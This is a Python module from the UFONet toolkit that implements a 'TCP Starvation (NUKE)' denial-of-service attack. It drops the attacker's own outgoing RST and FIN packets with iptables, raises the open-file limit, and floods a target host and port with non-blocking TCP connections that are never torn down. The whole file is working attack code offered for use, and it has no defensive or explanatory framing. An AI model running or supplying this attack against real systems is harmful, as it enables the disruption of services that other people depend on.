#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import socket, select, os, time, resource
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse

# UFONet TCP Starvation (NUKE)
def connect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)
    s.connect_ex((ip, port))
    return s

def nukeize(ip, port, rounds):
    n=0
    try: # RFC793 will lacks an exception if reset is not sent
        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000)) # modify kernel ulimit to: 100000
        os.system("iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP"%(ip, port)) # modify IPTABLES
        os.system("iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP"%(ip, port))
        epoll = select.epoll()
        connections = {}
        for x in range (0,int(rounds)):
            try:
                n=n+1
                s = connect(ip, port)
                print("[Info] [AI] [NUKE] Firing 'nuke' ["+str(n)+"] -> [SHOCKING!]")
                connections[s.fileno()] = s 
                epoll.register(s.fileno(), select.EPOLLOUT|select.EPOLLONESHOT)
            except:
                print("[Error] [AI] [NUKE] Failed to engage with 'nuke' ["+str(n)+"]")
        os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' %(ip, port)) # restore IPTABLES
        os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' %(ip, port))
    except:
        print("[Error] [AI] [NUKE] Failing to engage... -> Is still target online? -> [Checking!]")

class NUKE(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] TCP Starvation (NUKE) is ready to fire: [" , rounds, "nukes ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            port = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [NUKE] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        nukeize(ip, port, rounds) # attack with NUKE using threading
